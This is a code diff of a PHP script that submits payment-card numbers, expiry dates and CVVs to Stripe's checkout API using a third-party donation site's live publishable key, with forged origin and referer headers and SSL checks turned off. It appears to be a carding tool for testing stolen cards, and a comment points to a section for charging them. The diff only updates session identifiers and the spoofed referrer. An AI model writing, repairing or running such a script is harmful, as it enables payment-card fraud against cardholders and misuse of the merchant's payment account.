@@ -79,7 +79,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept-encoding: gzip, deflate, br',
 'content-type: application/x-www-form-urlencoded',
 'origin: https://checkout.stripe.com',
-'referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=92d78dee-ead1-d158-95ad-1c8ddd263833',
+'referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=ab6a92a1-f91b-1639-6d68-957940307538',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site'
 ));
@@ -90,7 +90,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.futureme.org%2Fsupport&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$name.'&time_on_page=15770&guid=95da8616-f593-4fdb-b65b-ee72d0a7cc56&muid=1be1b33c-fc43-4e50-a539-624933dcf36f&sid=2a52664f-37fc-48ca-ab03-735b41853e11&key=pk_live_9GV8Yezm7xiClB4kapZ2IN0r');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.futureme.org%2Fdonate&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$name.'&time_on_page=13411&guid=95da8616-f593-4fdb-b65b-ee72d0a7cc56&muid=ccc513c7-0a1e-44ff-809b-380cc4d4efd3&sid=0119c1a8-0b67-4f13-96b5-66a02b2134d3&key=pk_live_9GV8Yezm7xiClB4kapZ2IN0r');
 
 echo $result = curl_exec($ch);
 ////////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]
